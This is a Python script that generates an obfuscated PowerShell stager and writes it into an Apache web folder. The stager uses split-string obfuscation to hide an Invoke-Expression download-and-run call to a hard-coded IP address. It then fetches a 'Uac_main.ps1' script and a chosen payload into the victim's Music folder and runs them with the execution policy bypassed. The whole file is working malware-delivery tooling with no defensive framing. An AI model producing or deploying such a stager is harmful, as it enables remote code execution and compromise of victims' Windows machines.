import sys
import os

def replace_filename(code, filename):
    return code.replace("{filename}", filename)

def main():
    if len(sys.argv) != 2:
        print("Usage: python program.py <filename>")
        return

    name = sys.argv[1]

    code = r'''

&('{0}{1}'-f 'IE','X') ((&('{3}{2}{0}{1}' -f '-Obje','ct','w','Ne') ('{0}{1}{3}{2}' -f 'N','et.W','t','ebClien')).('{1}{3}{2}{0}'-f'String','Do','d','wnloa').Invoke('http://44.203.122.41:80/mini.ps1'));
$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Night_uac/Uac_main.ps1'
$file = "c:\Users\$env:USERNAME\Music\Uac_main.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Night_uac/payloads/{filename}'
$file = "c:\Users\$env:USERNAME\Music\{filename}"
$down.DownloadFile($url, $file);

powershell -ExecutionPolicy Bypass c:\Users\$env:USERNAME\Music\Uac_main.ps1
    '''

    modified_code = replace_filename(code, name)
    output_folder = 'C:\\Apache24\\htdocs\\Night_uac'
    os.makedirs(output_folder, exist_ok=True)
    output_file = os.path.join(output_folder, "Uac_stage.ps1")
    with open(output_file, "w") as file:
        file.write(modified_code)

if __name__ == "__main__":
    main()

